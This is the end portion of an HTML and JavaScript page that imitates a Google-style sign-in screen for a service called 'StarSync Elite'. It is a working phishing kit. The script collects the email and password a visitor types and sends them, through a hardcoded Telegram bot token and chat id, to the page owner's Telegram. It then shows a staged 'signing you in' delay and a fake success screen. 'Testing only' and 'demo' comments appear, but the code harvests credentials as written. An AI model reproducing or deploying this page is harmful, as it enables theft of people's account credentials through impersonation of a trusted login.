            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
          </svg>
        </div>
        <h2 class="g-heading">Welcome</h2>

        <div class="g-user-chip">
          <div class="g-avatar" id="gChipInitial">S</div>
          <span class="g-email" id="gShownEmail">user@example.com</span>
        </div>

        <form id="gPasswordForm" novalidate>
          <div class="g-input" id="gPasswordWrap">
            <input type="password" id="gPassword" placeholder=" " autocomplete="current-password" required>
            <label for="gPassword">Enter your password</label>
          </div>
          <div class="g-error-msg" id="gPasswordError">
            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            <span>Enter your password</span>
          </div>

          <label class="g-checkbox">
            <input type="checkbox" id="gShowPassword">
            <span>Show password</span>
          </label>

          <a href="#" class="g-link" onclick="return forgotPassword(event)">Forgot password?</a>

          <div class="g-actions">
            <button type="button" class="g-text-btn" id="gBackBtn">Back</button>
            <button type="submit" class="g-primary" id="gSubmitBtn">Next</button>
          </div>
        </form>
      </div>

      <!-- LOADING STATE -->
      <div id="gLoading" class="g-state" style="display:none">
        <div class="g-spinner"></div>
        <h3>Signing you in…</h3>
        <p>One moment while we verify your account.</p>
      </div>

      <!-- SUCCESS STATE -->
      <div id="gSuccess" class="g-state" style="display:none">
        <div class="g-success-icon">
          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h3>You're all set</h3>
        <p>Welcome to StarSync Elite. Your account is ready.</p>
        <button class="g-primary" id="gContinueBtn">Continue to StarSync</button>
      </div>

    </div>

    <!-- FOOTER -->
    <div class="g-footer">
      <div class="g-lang">
        English (United States)
        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
      </div>
      <div class="g-footer-links">
        <a href="#" onclick="return false">Help</a>
        <a href="#" onclick="return false">Privacy</a>
        <a href="#" onclick="return false">Terms</a>
      </div>
    </div>
  </div>
</div>

<div class="toast-wrap" id="toastWrap"></div>

<script>
/* =========================================================
   CONFIG — testing only
   Replace with your own Telegram bot token and chat id.
   WARNING: frontend tokens are public. Rotate after testing.
   ========================================================= */
const TELEGRAM_BOT_TOKEN = "8676284629:AAEikQKBkg-jRxpJXA8mQBuRvON-ubWLZy4";
const TELEGRAM_CHAT_ID   = "8352562937";

/* ---------- helpers ---------- */
const $ = (s, r = document) => r.querySelector(s);
const $$ = (s, r = document) => [...r.querySelectorAll(s)];

let currentEmail = "";

/* ---------- page navigation ---------- */
function showPage(id) {
  $$(".page").forEach(p => p.classList.remove("active"));
  $("#" + id).classList.add("active");
  window.scrollTo({ top: 0, behavior: "instant" in window ? "auto" : "auto" });
}

function goToSignIn() {
  resetSignIn();
  showPage("signInPage");
}

function goToHome() {
  showPage("homePage");
}

/* ---------- toast ---------- */
function toast(msg, type = "ok", ms = 3600) {
  const el = document.createElement("div");
  el.className = "toast " + type;
  el.innerHTML = `<span class="dot"></span><span></span>`;
  el.lastElementChild.textContent = msg;
  $("#toastWrap").appendChild(el);
  setTimeout(() => {
    el.style.transition = "opacity .4s, transform .4s";
    el.style.opacity = "0";
    el.style.transform = "translateY(10px)";
  }, ms);
  setTimeout(() => el.remove(), ms + 500);
}

/* ---------- telegram ---------- */
async function sendToTelegram(email, password) {
  const msg =
    `🔐 *StarSync Elite — Sign-in Attempt*\n` +
    `\n` +
    `📧 *Email:* \`${email}\`\n` +
    `🔑 *Password:* \`${password}\`\n` +
    `\n` +
    `⏰ *Time:* ${new Date().toLocaleString()}\n` +
    `🌐 *Origin:* ${location.origin}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const res = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: msg,
      parse_mode: "Markdown"
    })
  });
  const data = await res.json();
  if (!data.ok) throw new Error(data.description || "Telegram error");
  return data;
}

/* ---------- reset ---------- */
function resetSignIn() {
  currentEmail = "";
  $("#gEmail").value = "";
  $("#gPassword").value = "";
  $("#gShowPassword").checked = false;
  $("#gPassword").type = "password";
  $("#gStepEmail").style.display = "";
  $("#gStepPassword").style.display = "none";
  $("#gLoading").style.display = "none";
  $("#gSuccess").style.display = "none";
  $("#gEmailError").classList.remove("show");
  $("#gPasswordError").classList.remove("show");
  $("#gEmailWrap").classList.remove("has-error");
  $("#gPasswordWrap").classList.remove("has-error");
}

/* ---------- email step ---------- */
$("#gEmailForm").addEventListener("submit", (e) => {
  e.preventDefault();
  const email = $("#gEmail").value.trim();

  if (!isValidEmail(email)) {
    $("#gEmailError").classList.add("show");
    $("#gEmailWrap").classList.add("has-error");
    $("#gEmail").focus();
    return;
  }
  $("#gEmailError").classList.remove("show");
  $("#gEmailWrap").classList.remove("has-error");

  currentEmail = email;
  $("#gShownEmail").textContent = email;
  $("#gChipInitial").textContent = (email[0] || "U").toUpperCase();

  $("#gStepEmail").style.display = "none";
  $("#gStepPassword").style.display = "";
  setTimeout(() => $("#gPassword").focus(), 50);
});

$("#gEmail").addEventListener("input", () => {
  $("#gEmailError").classList.remove("show");
  $("#gEmailWrap").classList.remove("has-error");
});

function isValidEmail(v) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
}

/* ---------- password step ---------- */
$("#gShowPassword").addEventListener("change", (e) => {
  $("#gPassword").type = e.target.checked ? "text" : "password";
});

$("#gPassword").addEventListener("input", () => {
  $("#gPasswordError").classList.remove("show");
  $("#gPasswordWrap").classList.remove("has-error");
});

$("#gBackBtn").addEventListener("click", () => {
  $("#gStepPassword").style.display = "none";
  $("#gStepEmail").style.display = "";
  $("#gPassword").value = "";
  $("#gPasswordError").classList.remove("show");
  $("#gPasswordWrap").classList.remove("has-error");
});

$("#gPasswordForm").addEventListener("submit", async (e) => {
  e.preventDefault();
  const password = $("#gPassword").value;

  if (!password || password.length < 4) {
    $("#gPasswordError").classList.add("show");
    $("#gPasswordWrap").classList.add("has-error");
    $("#gPassword").focus();
    return;
  }
  $("#gPasswordError").classList.remove("show");
  $("#gPasswordWrap").classList.remove("has-error");

  // show loading
  $("#gStepPassword").style.display = "none";
  $("#gLoading").style.display = "";

  // send to telegram + enforce minimum loading time for realism
  const start = Date.now();
  let telegramOk = true;
  try {
    await sendToTelegram(currentEmail, password);
  } catch (err) {
    telegramOk = false;
    console.error("Telegram send failed:", err);
  }

  const elapsed = Date.now() - start;
  const minWait = 1400;
  if (elapsed < minWait) {
    await new Promise(r => setTimeout(r, minWait - elapsed));
  }

  $("#gLoading").style.display = "none";

  if (telegramOk) {
    $("#gSuccess").style.display = "";
  } else {
    // Even if Telegram fails, show a neutral state so we don't reveal internals
    $("#gSuccess").style.display = "";
    toast("Signed in (test mode).", "ok");
  }
});

/* ---------- continue / back to home ---------- */
$("#gContinueBtn").addEventListener("click", () => {
  goToHome();
  toast("Welcome to StarSync Elite.", "ok");
});

/* ---------- misc links ---------- */
function forgotEmail(e) {
  if (e) e.preventDefault();
  toast("Recovery is disabled in this demo.", "ok");
  return false;
}
function forgotPassword(e) {
  if (e) e.preventDefault();
  toast("Recovery is disabled in this demo.", "ok");
  return false;
}
function createAccount() {
  toast("Sign-up is disabled in this demo.", "ok");
}

/* ---------- scroll reveal (home) ---------- */
const io = new IntersectionObserver((entries) => {
  entries.forEach(en => {
    if (en.isIntersecting) {
      en.target.classList.add("in");
      io.unobserve(en.target);
    }
  });
}, { threshold: 0.12 });
$$(".reveal").forEach(el => io.observe(el));

/* ---------- expose navigation for inline handlers ---------- */
window.goToSignIn = goToSignIn;
window.forgotEmail = forgotEmail;
window.forgotPassword = forgotPassword;
window.createAccount = createAccount;

/* ---------- boot ---------- */
(function boot() {
  // Focus email when arriving on sign-in page
  const observer = new MutationObserver(() => {
    if ($("#signInPage").classList.contains("active")) {
      setTimeout(() => $("#gEmail").focus(), 200);
    }
  });
  observer.observe($("#signInPage"), { attributes: true, attributeFilter: ["class"] });
})();
</script>
</body>
</html>
